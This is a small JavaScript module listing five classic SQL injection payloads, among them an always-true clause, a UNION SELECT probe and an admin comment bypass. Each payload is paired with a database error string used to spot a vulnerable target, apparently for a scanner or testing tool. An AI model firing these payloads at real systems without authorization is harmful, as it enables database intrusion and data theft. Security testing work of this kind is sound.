module.exports = [
  { payload: "' OR '1'='1", indicator: "SQL syntax" },
  { payload: "\" OR \"1\"=\"1", indicator: "mysql_fetch" },
  { payload: "' UNION SELECT NULL--", indicator: "database error" },
  { payload: "admin' --", indicator: "ORA-01756" },
  { payload: "1' AND '1'='1", indicator: "pg_query" }
];
